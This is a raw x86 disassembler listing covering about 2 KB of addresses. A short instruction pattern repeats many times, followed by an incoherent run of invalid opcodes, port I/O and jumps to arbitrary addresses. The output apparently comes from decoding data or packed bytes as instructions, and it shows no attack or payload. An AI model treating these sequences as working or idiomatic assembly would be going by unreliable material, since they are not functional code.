  421b0d:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b13:	cs fcomi st,st(4)
  421b16:	mov    al,0x1e
  421b18:	ss push edx
  421b1a:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b20:	cs fcomi st,st(4)
  421b23:	mov    al,0x1e
  421b25:	ss push edx
  421b27:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b2d:	cs fcomi st,st(4)
  421b30:	mov    al,0x1e
  421b32:	ss push edx
  421b34:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b3a:	cs fcomi st,st(4)
  421b3d:	mov    al,0x1e
  421b3f:	ss push edx
  421b41:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b47:	cs fcomi st,st(4)
  421b4a:	mov    al,0x1e
  421b4c:	ss push edx
  421b4e:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b54:	cs fcomi st,st(4)
  421b57:	mov    al,0x1e
  421b59:	ss push edx
  421b5b:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b61:	cs fcomi st,st(4)
  421b64:	mov    al,0x1e
  421b66:	ss push edx
  421b68:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b6e:	cs fcomi st,st(4)
  421b71:	mov    al,0x1e
  421b73:	ss push edx
  421b75:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b7b:	cs fcomi st,st(4)
  421b7e:	mov    al,0x1e
  421b80:	ss push edx
  421b82:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b88:	cs fcomi st,st(4)
  421b8b:	mov    al,0x1e
  421b8d:	ss push edx
  421b8f:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b95:	cs fcomi st,st(4)
  421b98:	mov    al,0x1e
  421b9a:	ss push edx
  421b9c:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421ba2:	cs fcomi st,st(4)
  421ba5:	mov    al,0x1e
  421ba7:	ss push edx
  421ba9:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421baf:	cs fcomi st,st(4)
  421bb2:	mov    al,0x1e
  421bb4:	ss push edx
  421bb6:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421bbc:	cs fcomi st,st(4)
  421bbf:	mov    al,0x1e
  421bc1:	ss push edx
  421bc3:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421bc9:	cs fcomi st,st(4)
  421bcc:	mov    al,0x1e
  421bce:	ss push edx
  421bd0:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421bd6:	cs fcomi st,st(4)
  421bd9:	mov    al,0x1e
  421bdb:	ss push edx
  421bdd:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421be3:	cs fcomi st,st(4)
  421be6:	mov    al,0x1e
  421be8:	ss push edx
  421bea:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421bf0:	cs fcomi st,st(4)
  421bf3:	mov    al,0x1e
  421bf5:	ss push edx
  421bf7:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421bfd:	cs fcomi st,st(4)
  421c00:	mov    al,0x1e
  421c02:	ss push edx
  421c04:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c0a:	cs fcomi st,st(4)
  421c0d:	mov    al,0x1e
  421c0f:	ss push edx
  421c11:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c17:	cs fcomi st,st(4)
  421c1a:	mov    al,0x1e
  421c1c:	ss push edx
  421c1e:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c24:	cs fcomi st,st(4)
  421c27:	mov    al,0x1e
  421c29:	ss push edx
  421c2b:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c31:	cs fcomi st,st(4)
  421c34:	mov    al,0x1e
  421c36:	ss push edx
  421c38:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c3e:	cs fcomi st,st(4)
  421c41:	mov    al,0x1e
  421c43:	ss push edx
  421c45:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c4b:	cs fcomi st,st(4)
  421c4e:	mov    al,0x1e
  421c50:	ss push edx
  421c52:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c58:	cs fcomi st,st(4)
  421c5b:	mov    al,0x1e
  421c5d:	ss push edx
  421c5f:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c65:	cs fcomi st,st(4)
  421c68:	mov    al,0x1e
  421c6a:	ss push edx
  421c6c:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c72:	cs fcomi st,st(4)
  421c75:	mov    al,0x1e
  421c77:	ss push edx
  421c79:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c7f:	cs fcomi st,st(4)
  421c82:	mov    al,0x1e
  421c84:	ss push edx
  421c86:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c8c:	cs fcomi st,st(4)
  421c8f:	mov    al,0x1e
  421c91:	ss push edx
  421c93:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421c99:	cs fcomi st,st(4)
  421c9c:	mov    al,0x1e
  421c9e:	ss push edx
  421ca0:	xchg   ebp,eax
  421ca1:	inc    ebp
  421ca2:	push   edi
  421ca3:	add    al,0xcc
  421ca5:	lahf   
  421ca6:	cs retf 
  421ca8:	hlt    
  421ca9:	mov    al,0x34
  421cab:	xchg   esp,eax
  421cac:	mov    BYTE PTR [ebx+0x7d29a2cd],ah
  421cb2:	sbb    BYTE PTR [esi+0x36],bh
  421cb5:	ret    0xd58
  421cb8:	add    bh,0xb4
  421cbb:	fcmovu st,st(1)
  421cbd:	pop    esi
  421cbe:	lock cs cdq 
  421cc1:	int    0x99
  421cc3:	push   esp
  421cc4:	xchg   esp,eax
  421cc5:	mov    bh,0x94
  421cc7:	cld    
  421cc8:	leave  
  421cc9:	int    0x3b
  421ccb:	fisubr DWORD PTR [ecx+eiz*2+0x1e92e36a]
  421cd2:	adc    ebp,esi
  421cd4:	pop    edx
  421cd5:	dec    BYTE PTR [ecx+ebp*2]
  421cd8:	dec    edx
  421cd9:	lods   eax,DWORD PTR ds:[esi]
  421cda:	adc    eax,DWORD PTR [esi]
  421cdc:	loopne 0x421cdf
  421cde:	jle    0x421d06
  421ce0:	or     esp,esi
  421ce2:	mov    edx,0xf3426db2
  421ce7:	leave  
  421ce8:	popa   
  421ce9:	fdiv   DWORD PTR [edi-0x6d]
  421cec:	bound  ebp,QWORD PTR [esp+eiz*8-0x1e626f25]
  421cf3:	aas    
  421cf4:	out    0xdf,eax
  421cf6:	arpl   cx,cx
  421cf8:	and    DWORD PTR [edx],ebp
  421cfa:	daa    
  421cfb:	iret   
  421cfc:	sbb    dh,bl
  421cfe:	sar    DWORD PTR [eax+0x47],cl
  421d01:	imul   edx,DWORD PTR [ecx+0x5a13f9f8],0x15a658e8
  421d0b:	cli    
  421d0c:	add    eax,0x91d11368
  421d11:	out    0xa8,al
  421d13:	cmc    
  421d14:	int3   
  421d15:	adc    cl,bl
  421d17:	mov    ecx,DWORD PTR [edi-0x60]
  421d1a:	jnp    0x421ce8
  421d1c:	xor    ah,BYTE PTR [ebx+edi*8]
  421d1f:	popf   
  421d20:	out    dx,al
  421d21:	jns    0x421d95
  421d23:	scas   eax,DWORD PTR es:[edi]
  421d24:	mov    dh,0x8f
  421d26:	jge    0x421d03
  421d28:	int3   
  421d29:	or     al,0x86
  421d2b:	xchg   ebx,eax
  421d2c:	sbb    DWORD PTR [ebx],ebx
  421d2e:	add    DWORD PTR [edx],0xab5e388a
  421d34:	mov    eax,ds:0xf338587f
  421d39:	retf   0x50dd
  421d3c:	cmp    dh,BYTE PTR [ecx-0x69]
  421d3f:	(bad)  
  421d40:	mov    bl,0xb2
  421d42:	or     BYTE PTR [ebp-0x2d9c74be],dl
  421d48:	xchg   ecx,eax
  421d49:	ins    DWORD PTR es:[edi],dx
  421d4a:	cs or  eax,0x5ad809a
  421d50:	push   0x3
  421d52:	pop    edi
  421d53:	jecxz  0x421d24
  421d55:	mov    ch,0x21
  421d57:	and    eax,0xb28b5e96
  421d5c:	inc    esp
  421d5d:	fisttp WORD PTR [esi]
  421d5f:	ds pop ecx
  421d61:	mov    al,0xca
  421d63:	call   0x654fc89d
  421d68:	ss daa 
  421d6a:	push   cs
  421d6b:	cmp    dl,BYTE PTR [ebx]
  421d6d:	mov    ecx,0xecc86e6
  421d72:	jg     0x421d52
  421d74:	cmp    eax,DWORD PTR [edx+edx*1-0x11]
  421d78:	(bad)  
  421d79:	pop    esp
  421d7a:	jge    0x421d02
  421d7c:	cmp    eax,0x7f4049c3
  421d81:	mov    bh,0x4b
  421d83:	jl     0x421dcf
  421d85:	fldenv [eax]
  421d87:	daa    
  421d88:	lds    edx,FWORD PTR fs:[esi+0x60]
  421d8c:	mov    fs,WORD PTR [edx-0x7ffa27c8]
  421d92:	addr16 je 0x421d41
  421d95:	(bad)  
  421d96:	cli    
  421d97:	pusha  
  421d98:	jo     0x421d7b
  421d9a:	pop    es
  421d9b:	mov    eax,0xf2607dfc
  421da0:	xor    DWORD PTR [eax-0x57],edx
  421da3:	retf   
  421da4:	mov    cl,0xb5
  421da6:	and    BYTE PTR [edi],al
  421da8:	ins    BYTE PTR es:[edi],dx
  421da9:	mov    ah,0x85
  421dab:	adc    al,0xb1
  421dad:	push   0x2c
  421daf:	push   eax
  421db0:	adc    al,0x9d
  421db2:	or     al,0x76
  421db4:	xchg   ebx,eax
  421db5:	in     eax,0x69
  421db7:	scas   eax,DWORD PTR es:[edi]
  421db8:	or     al,0x6a
  421dba:	call   0x18fb:0xf87ea78f
  421dc1:	aas    
  421dc2:	jge    0x421e34
  421dc4:	cmp    DWORD PTR [eax+0x1a],ecx
  421dc7:	mov    ds:0x2e50f6a3,eax
  421dcc:	pop    ebp
  421dcd:	shl    BYTE PTR [eax+0x30],0x7d
  421dd1:	fistp  QWORD PTR [edi-0x300cf613]
  421dd7:	pop    ss
  421dd8:	adc    BYTE PTR [ebx+0x64],0xe1
  421ddc:	jmp    0xc4ef2041
  421de1:	(bad)
  421de4:	or     esp,DWORD PTR [edi]
  421de6:	pop    ebp
  421de7:	sahf   
  421de8:	shl    ah,cl
  421dea:	fistp  QWORD PTR [edx+esi*2-0x64]
  421dee:	inc    eax
  421def:	adc    BYTE PTR [edx],bh
  421df1:	outs   dx,BYTE PTR ds:[esi]
  421df2:	(bad)  
  421df3:	out    dx,al
  421df4:	lock jmp 0x421e1e
  421df7:	or     bh,al
  421df9:	nop
  421dfa:	pop    es
  421dfb:	dec    ebp
  421dfc:	pusha  
  421dfd:	nop
  421dfe:	mov    ds:0xb6745c6c,eax
  421e03:	and    bh,bl
  421e05:	mov    eax,0x28415736
  421e0a:	shl    DWORD PTR [edx+0x6bd5f96a],cl
  421e10:	push   eax
  421e11:	add    al,0xc2
  421e13:	rol    BYTE PTR [esi-0x11],1
  421e16:	adc    ebp,DWORD PTR [edx-0x3dc1dcbf]
  421e1c:	mov    edi,0xfbef6e05
  421e21:	mov    al,BYTE PTR [ecx+eax*1-0x5e113798]
  421e28:	sub    BYTE PTR ds:[edx],al
  421e2b:	xor    eax,0xc3c9bf64
  421e30:	add    ebx,ecx
  421e32:	ror    BYTE PTR [eax],0xe6
  421e35:	xchg   DWORD PTR [edx-0x36],edi
  421e38:	pop    ebx
  421e39:	jl     0x421e8a
  421e3b:	dec    ebx
  421e3c:	imul   edi,DWORD PTR [ecx-0x4f],0xeacd229b
  421e43:	std    
  421e44:	(bad)  
  421e45:	jl     0x421e36
  421e47:	data16 arpl ax,di
  421e4a:	bound  ebx,QWORD PTR [esi-0x18b3a89c]
  421e50:	adc    DWORD PTR [esp+ecx*4+0x40],edx
  421e54:	add    ah,BYTE PTR [ebx+0x29f9b635]
  421e5a:	mov    ch,0x87
  421e5c:	pop    ebp
  421e5d:	icebp  
  421e5e:	cmp    al,0x31
  421e60:	inc    esp
  421e61:	icebp  
  421e62:	inc    esi
  421e63:	inc    esi
  421e64:	icebp  
  421e65:	(bad)  
  421e66:	mov    esi,eax
  421e68:	adc    eax,0x2c17a22d
  421e6d:	mov    DWORD PTR ds:0x1dd2945a,edx
  421e73:	fxch   st(6)
  421e75:	dec    edi
  421e76:	inc    edi
  421e77:	mov    WORD PTR [esi],?
  421e79:	sbb    eax,0xf903e913
  421e7e:	mov    ebx,0x4a6a4d3f
  421e83:	inc    ebx
  421e84:	jp     0x421e9c
  421e86:	ret    
  421e87:	pushf  
  421e88:	das    
  421e89:	jl     0x421ea4
  421e8b:	adc    BYTE PTR [edx],ah
  421e8d:	xchg   ebp,eax
  421e8e:	xor    bh,bh
  421e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e91:	pop    es
  421e92:	fld    DWORD PTR [edx-0x209c5cdb]
  421e98:	adc    DWORD PTR [edx+0x1c],esi
  421e9b:	mov    ah,0xbe
  421e9d:	xor    DWORD PTR [esp+edx*1-0x56f8d943],ecx
  421ea4:	and    edi,0xffffffa0
  421ea7:	outs   dx,BYTE PTR ds:[esi]
  421ea9:	mov    bh,0x9d
  421eab:	adc    ebx,eax
  421ead:	test   dl,bh
  421eaf:	jae    0x421ed0
  421eb1:	aaa    
  421eb2:	mov    esi,DWORD PTR [eax+0x27]
  421eb5:	mov    ebx,0xfd989e0e
  421eba:	mov    dl,0xd1
  421ebc:	adc    al,0x17
  421ebe:	cdq    
  421ebf:	rcl    DWORD PTR [edi-0x73ef4743],0xfc
  421ec6:	xor    cl,BYTE PTR [ecx+0x413f3fad]
  421ecc:	mov    esi,0xd6be462d
  421ed1:	adc    al,0x52
  421ed3:	test   eax,0x9961999a
  421ed8:	mul    edi
  421eda:	jo     0x421ee9
  421edc:	frstor [edx-0x39]
  421edf:	add    dh,dl
  421ee1:	loopne 0x421f25
  421ee3:	jg     0x421e7d
  421ee5:	js     0x421e83
  421ee7:	push   0xfffffff8
  421ee9:	sbb    esi,DWORD PTR [eax+0x2eb040e9]
  421eef:	pusha  
  421ef0:	xor    BYTE PTR [esi],ch
  421ef2:	xlat   BYTE PTR ds:[ebx]
  421ef3:	shl    DWORD PTR [eax],cl
  421ef5:	pop    edi
  421ef6:	cvtps2pi mm3,QWORD PTR [esi-0x78]
  421efa:	push   ds
  421efb:	icebp  
  421efc:	jl     0x421f10
  421efe:	fist   DWORD PTR [ecx+0x63370b63]
  421f04:	dec    eax
  421f05:	sub    cl,bh
  421f07:	cmp    eax,0x6647be27
  421f0c:	ins    DWORD PTR es:[edi],dx
  421f0d:	mov    ds:0x69ef6e3f,eax
  421f12:	hlt    
  421f13:	in     eax,0x3e
  421f15:	popa   
  421f16:	inc    ebp
  421f17:	sbb    BYTE PTR [ecx-0x34f5e0bb],ah
  421f1d:	clc    
  421f1e:	xchg   ebx,eax
  421f1f:	xor    esp,ebx
  421f21:	xchg   ebx,eax
  421f22:	or     al,0xc5
  421f24:	cmp    ah,ah
  421f26:	mov    ebx,ds
  421f28:	sbb    edi,DWORD PTR [eax-0x63afbc57]
  421f2e:	xchg   esp,eax
  421f2f:	div    DWORD PTR [edi+0x5c9bf88f]
  421f35:	mov    al,ds:0xa651fb6f
  421f3a:	xchg   ecx,eax
  421f3b:	ror    bl,cl
  421f3d:	repz inc BYTE PTR [ebp+0x6b930f25]
  421f44:	adc    al,0x45
  421f46:	inc    ebp
  421f47:	stos   DWORD PTR es:[edi],eax
  421f48:	and    eax,0x1055b743
  421f4d:	dec    edx
  421f4e:	call   0xa03e:0xbfe649e1
  421f55:	sbb    BYTE PTR [ecx],ah
  421f57:	or     bl,0x65
  421f5a:	or     ecx,ebp
  421f5c:	shl    DWORD PTR [ebx+ecx*8],cl
  421f5f:	dec    eax
  421f60:	int3   
  421f61:	jmp    0x6de8d44e
  421f66:	add    DWORD PTR [edx+0x79],eax
  421f69:	push   esp
  421f6a:	mov    eax,0x9f8a99b2
  421f6f:	pop    edi
  421f70:	jnp    0x421f76
  421f72:	pop    ss
  421f73:	mov    esp,0x5011951b
  421f78:	outs   dx,BYTE PTR ds:[esi]
  421f79:	out    dx,al
  421f7a:	rcl    BYTE PTR [edi+0x64],1
  421f7d:	xor    al,0x6e
  421f7f:	rcl    BYTE PTR [esi+0x47],0x11
  421f83:	mov    ecx,0xfe52ce3f
  421f88:	cld    
  421f89:	mov    ss,ebx
  421f8b:	fld    TBYTE PTR [ebx]
  421f8d:	test   al,0x67
  421f8f:	rcl    BYTE PTR [ecx-0x6e13c326],cl
  421f95:	cmp    BYTE PTR [esi],dh
  421f97:	aam    0x0
  421f99:	dec    edx
  421f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f9b:	jmp    0xd60b:0x21786f0b
  421fa2:	jg     0x421ff5
  421fa4:	cwde   
  421fa5:	push   esp
  421fa6:	jne    0x422005
  421fa8:	(bad)  
  421fa9:	cwde   
  421faa:	mov    ecx,0x64c15d0b
  421faf:	or     DWORD PTR [edx+0x42],esp
  421fb2:	sub    al,0xcb
  421fb4:	loop   0x422032
  421fb6:	sahf   
  421fb7:	(bad)  
  421fb8:	cmp    ecx,DWORD PTR [ebx-0x6779fef8]
  421fbe:	mov    cl,0x79
  421fc0:	xor    al,0xdd
  421fc2:	pop    es
  421fc3:	push   eax
  421fc4:	mov    eax,ds:0xa712aa12
  421fc9:	inc    ebx
  421fca:	neg    DWORD PTR [edi+0x43f85842]
  421fd0:	mov    dh,0x88
  421fd2:	push   cs
  421fd3:	cld    
  421fd4:	lea    esp,[edi-0x6df85764]
  421fda:	ret    0x5202
  421fdd:	sbb    BYTE PTR [esi],dl
  421fdf:	test   DWORD PTR [edx+0x5b],0x104b02e6
  421fe6:	fadd   DWORD PTR [ebx+0x70d57d2]
  421fec:	jl     0x42200b
  421fee:	dec    ecx
  421fef:	sub    BYTE PTR [eax+eiz*1],ah
  421ff2:	pop    esi
  421ff3:	jge    0x42206f
  421ff5:	ret    
  421ff6:	test   eax,0x2aa9ed06
  421ffb:	mov    eax,0xd2b6cfcd
  422000:	xor    BYTE PTR [ecx+ebp*8+0x7f],cl
  422004:	cdq    
  422005:	jns    0x421fe5
  422007:	cmp    al,0x80
  422009:	xchg   BYTE PTR [esi+0x6c388e02],dl
  42200f:	fsub   QWORD PTR [ebp+0x59ec8cc0]
  422015:	(bad)  
  422017:	fldcw  WORD PTR [ebp+0x76c318de]
  42201d:	jnp    0x421fcc
  42201f:	dec    edx
  422020:	mov    bh,0x76
  422022:	retf   0x65a5
  422025:	dec    edi
  422026:	mov    ebp,0xed320667
  42202b:	sub    eax,0x409277ef
  422030:	iret   
  422031:	pop    ecx
  422032:	and    ebp,DWORD PTR [ecx]
  422034:	lock xor ebx,ebx
  422037:	mov    dh,0x54
  422039:	cmp    dh,BYTE PTR [eax]
  42203b:	cmp    eax,0xed13ddfa
  422040:	pop    ds
  422041:	inc    eax
  422042:	daa    
  422043:	mov    ds:0xb736f6bb,eax
  422048:	ja     0x42202f
  42204a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42204b:	xor    al,0xe2
  42204d:	dec    ecx
  42204e:	bound  ebx,QWORD PTR ds:0x816b6913
  422054:	lods   eax,DWORD PTR ds:[esi]
  422055:	jmp    0xaa982803
  42205a:	mov    dh,0x71
  42205c:	sub    bh,bh
  42205e:	jmp    0x46b3d21f
  422063:	mov    ebx,0x5219c97d
  422068:	arpl   sp,dx
  42206a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42206b:	sub    BYTE PTR [edi+0x5f29bfff],cl
  422071:	psllw  mm3,mm3
  422074:	add    bh,BYTE PTR ds:0xaa900b10
  42207a:	(bad)  
  42207b:	stc    
  42207c:	sbb    bh,ch
  42207e:	dec    ebx
  42207f:	dec    esp
  422080:	jmp    0x4220bb
  422082:	pusha  
  422083:	ja     0x4220a9
  422085:	ret    
  422086:	push   esp
  422087:	jp     0x422038
  422089:	scas   al,BYTE PTR es:[edi]
  42208a:	repnz xchg cl,dh
  42208d:	shl    ebp,1
  42208f:	xor    BYTE PTR [edx],al
  422091:	(bad)  
  422093:	repnz and cl,dl
  422096:	sbb    bl,bl
  422098:	push   0xd0e41ce7
  42209d:	xchg   ebp,eax
  42209e:	int    0xd9
  4220a0:	pop    ebx
  4220a1:	jnp    0x422085
  4220a3:	(bad)  
  4220a4:	dec    edi
  4220a5:	dec    edx
  4220a6:	repnz jmp FWORD PTR [ebp+0x1d57448a]
  4220ad:	pop    ebx
  4220ae:	mov    ebp,0x8366e755
  4220b3:	repnz dec eax
  4220b5:	nop
  4220b6:	sbb    BYTE PTR [ecx],ah
  4220b8:	arpl   WORD PTR ds:0xd9dbf1b8,si
  4220be:	cmp    cl,BYTE PTR [esp+edx*2-0x49]
  4220c2:	stos   DWORD PTR es:[edi],eax
  4220c3:	inc    eax
  4220c4:	lahf   
  4220c5:	add    eax,0xbba095c6
  4220ca:	cmp    al,0x95
  4220cc:	test   al,0x35
  4220ce:	out    dx,eax
  4220cf:	and    edx,DWORD PTR [edi-0x19]
  4220d2:	mov    ecx,edx
  4220d4:	clc    
  4220d5:	cmp    dl,al
  4220d7:	aad    0xf6
  4220d9:	gs clc 
  4220db:	(bad)  
  4220dc:	popa   
  4220dd:	ins    DWORD PTR es:[edi],dx
  4220de:	test   BYTE PTR [ebp+0x28],bh
  4220e1:	jge    0x422137
  4220e3:	mov    al,ds:0x26c8b0f9
  4220e8:	and    DWORD PTR [eax-0x6a6f5997],esi
  4220ee:	add    DWORD PTR [ebx+ebp*8+0x2d93f126],0xd86b17e4
  4220f9:	inc    esp
  4220fa:	or     al,0xfa
  4220fc:	std    
  4220fd:	mov    bl,0x27
  4220ff:	push   eax
  422100:	stos   BYTE PTR es:[edi],al
  422101:	aam    0xe8
  422103:	sbb    BYTE PTR [ecx-0x379eb597],cl
  422109:	ins    DWORD PTR es:[edi],dx
  42210a:	imul   BYTE PTR [eax+0x5d]
  42210d:	inc    edx
  42210e:	xchg   dh,bl
  422110:	push   edi
  422111:	pop    eax
  422112:	add    ecx,DWORD PTR [edi-0x5e]
  422115:	fdiv   QWORD PTR [edx+edx*2]
  422118:	mov    ch,BYTE PTR [ebx]
  42211a:	fist   DWORD PTR [ebx]
  42211c:	inc    edx
  42211d:	ss jne 0x422114
  422120:	(bad)  
  422121:	mul    DWORD PTR [ecx]
  422123:	pushf  
  422124:	dec    ecx
  422125:	or     al,0xc6
  422127:	xor    BYTE PTR [ebx],0x28
  42212a:	mov    bh,0x93
  42212c:	mov    al,ds:0x5a2c1af0
  422131:	int    0xc6
  422133:	mov    ebx,0x55f58cd0
  422138:	xor    esp,DWORD PTR [ebx+eiz*4-0x4f]
  42213c:	aas    
  42213d:	mov    BYTE PTR [edx+0x4c],dh
  422140:	or     BYTE PTR [eax],bl
  422142:	lds    edx,FWORD PTR [esp+eiz*4-0x5e]
  422146:	scas   eax,DWORD PTR es:[edi]
  422147:	imul   edi,DWORD PTR [ebp+eax*2+0x6b8e2e08],0xffffffeb
  42214f:	xor    DWORD PTR [eax],0xffffffd0
  422152:	stos   DWORD PTR es:[edi],eax
  422153:	out    0xbe,eax
  422155:	psrld  mm6,mm7
  422158:	out    0x11,al
  42215a:	sub    ecx,ebx
  42215c:	jbe    0x42210a
  42215e:	jp     0x42217e
  422160:	fadd   DWORD PTR [edx-0x4]
  422163:	push   0xffffffaa
  422165:	sub    ah,bh
  422167:	fdivrp st(3),st
  422169:	xor    DWORD PTR [ebx-0x1d68cf29],esp
  42216f:	pushf  
  422170:	inc    edi
  422171:	mov    ecx,0x7a1ac2a1
  422176:	mov    ah,0x94
  422178:	sbb    al,0x95
  42217a:	inc    edx
  42217b:	mov    fs,WORD PTR [edi+0x18c6edf4]
  422181:	jae    0x42214a
  422183:	outs   dx,DWORD PTR ds:[esi]
  422184:	data16 mov cl,ah
  422187:	loop   0x422109
  422189:	retf   0xbc7c
  42218c:	inc    bl
  42218e:	cmp    eax,0xd42ff5a3
  422193:	inc    edx
  422194:	mov    ss,WORD PTR [edi]
  422196:	arpl   WORD PTR [edi-0x4c],dx
  422199:	pop    es
  42219a:	pop    ds
  42219b:	add    dl,BYTE PTR [eax+0x501a648a]
  4221a1:	int    0x14
  4221a3:	or     esp,DWORD PTR [esi+0x3d]
  4221a6:	and    ebx,DWORD PTR [eax+0x7931fe1c]
  4221ac:	call   0x5d4a:0xe87e241c
  4221b3:	sub    BYTE PTR [ecx],dh
  4221b5:	mov    ds:0x3a73ee66,al
  4221ba:	sub    eax,0x9ffe55fb
  4221bf:	sahf   
  4221c0:	pop    ds
  4221c1:	jl     0x422194
  4221c3:	adc    edi,DWORD PTR [ecx-0x4cfe60fd]
  4221c9:	dec    BYTE PTR [eax]
  4221cb:	aaa    
  4221cc:	mov    cl,0x10
  4221ce:	sbb    ch,ch
  4221d0:	test   eax,0xe4437dc4
  4221d5:	mov    ecx,0x9224796f
  4221da:	mov    esi,DWORD PTR [edx-0x2f]
  4221dd:	rol    BYTE PTR es:[ecx],cl
  4221e0:	xor    BYTE PTR [ebp+0x8],bl
  4221e3:	pushf  
  4221e4:	(bad)  
  4221e5:	(bad)  
  4221e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e7:	ret    0x8d44
  4221ea:	adc    cl,BYTE PTR [ebx+0x73]
  4221ed:	das    
  4221ee:	mov    esi,DWORD PTR [esp+ecx*2+0x1]
  4221f2:	sub    al,0xee
  4221f4:	(bad)  
  4221f5:	les    esp,FWORD PTR [ebx+0x11]
  4221f8:	and    cl,al
  4221fa:	rol    DWORD PTR [esi+ebx*2],1
  4221fd:	dec    edi
  4221fe:	aaa    
  4221ff:	or     BYTE PTR [ebx],ah
  422201:	xchg   ecx,eax
  422202:	or     BYTE PTR [eax+ebp*8-0x75],dl
  422206:	pop    edi
  422207:	sub    al,0x78
  422209:	sti    
  42220a:	sbb    BYTE PTR [eax],ch
  42220c:	ds fwait
  42220e:	push   eax
  42220f:	jns    0x4221c0
  422211:	mov    edi,0x357a9fdc
  422216:	push   eax
  422217:	xor    DWORD PTR [eax],eax
  422219:	cmp    al,0x5b
  42221b:	scas   eax,DWORD PTR es:[edi]
  42221c:	sbb    DWORD PTR [esi],esp
  42221e:	repz dec esp
  422220:	adc    BYTE PTR [eax+0x3f5f5bad],bl
  422226:	aam    0xba
  422228:	retf   
  422229:	add    ebx,DWORD PTR [edx+0x69]
  42222c:	xor    esp,DWORD PTR [eax]
  42222e:	cmp    eax,0xcc33614e
  422233:	aam    0xb2
  422235:	inc    ebx
  422236:	(bad)  
  422237:	push   edi
  422238:	outs   dx,BYTE PTR ds:[esi]
  422239:	sahf   
  42223a:	or     DWORD PTR [ebp+0x38ec6a70],ebp
  422240:	or     al,0xcd
  422242:	out    dx,al
  422243:	out    0xe7,al
  422245:	es stos DWORD PTR es:[edi],eax
  422247:	add    eax,0x9abd2da5
  42224c:	xchg   ebp,eax
  42224d:	pop    ds
  42224e:	cmp    DWORD PTR [ebp+0x6],esp
  422251:	stos   BYTE PTR es:[edi],al
  422252:	jb     0x4221d6
  422254:	or     BYTE PTR [ecx+0x47],dh
  422257:	ret    
  422258:	jg     0x4222aa
  42225a:	sbb    dl,dl
  42225c:	cmp    eax,0x184b69f0
  422261:	push   0x563f36f0
  422266:	push   ebx
  422267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422268:	adc    BYTE PTR [ebp+0x61ff551],bl
  42226e:	fs mov ebp,0x1a81c7ba
  422274:	cmp    al,0xa4
  422276:	mov    ?,WORD PTR [ebp+0x5b8868a8]
  42227c:	sub    dl,BYTE PTR [ecx]
  42227e:	push   edi
  42227f:	in     eax,dx
  422280:	shr    dh,0x26
  422283:	mov    ds:0x7f9e37a2,al
  422288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422289:	mov    dh,0xad
  42228b:	in     eax,0xac
  42228d:	add    esi,ecx
  42228f:	sbb    BYTE PTR [ebx+eiz*4],cl
  422292:	adc    DWORD PTR [ebp+eax*1+0x141f3a4d],0x8e507334
  42229d:	and    al,0x9
  42229f:	fbstp  TBYTE PTR [ecx-0x9]
  4222a2:	pop    edx
  4222a3:	xchg   ch,cl
  4222a5:	cli    
  4222a6:	mov    ah,0xc6
  4222a8:	sahf   
  4222a9:	clc    
  4222aa:	js     0x422324
  4222ac:	add    eax,0x7d39d9f6
  4222b1:	mov    cl,0x65
  4222b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222b4:	aaa    
  4222b5:	lahf   
  4222b6:	add    eax,0x96b4e154
  4222bb:	sbb    BYTE PTR [ebp+eax*8+0x4756d850],cl
  4222c2:	jmp    0x42231e
  4222c4:	sub    eax,0x32e95114
  4222c9:	test   eax,0x90773d29
  4222ce:	neg    BYTE PTR [edx]
  4222d0:	push   ebx
  4222d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222d2:	and    eax,0xe3c1905c
  4222d7:	inc    ebp
  4222d8:	cmc    
  4222d9:	push   ss
  4222da:	mov    edi,0xcc2cebf4
  4222df:	jb     0x422287
  4222e1:	jge    0x42234f
  4222e3:	std    
  4222e4:	icebp  
  4222e5:	sti    
  4222e6:	test   al,0x88
  4222e8:	adc    ebx,0xffffffd5
  4222eb:	jmp    0x5e92:0x23206a7f
  4222f2:	loope  0x422356
  4222f4:	aas    
  4222f5:	inc    edi
  4222f6:	dec    ebp
  4222f7:	sub    DWORD PTR [edx+eax*2+0x448e9a17],esi
  4222fe:	in     eax,dx
  4222ff:	(bad)  [eax+ebp*8+0x64]
  422303:	ds cmp al,0x1d
  422306:	dec    esp
  422307:	adc    DWORD PTR [eiz*1-0xaf3f17b],edi
  42230e:	dec    edi
  42230f:	mul    DWORD PTR [eax]
  422311:	gs push es
  422313:	addr16 loope 0x422342
  422316:	add    dh,BYTE PTR [ebp+0x43dae5b2]
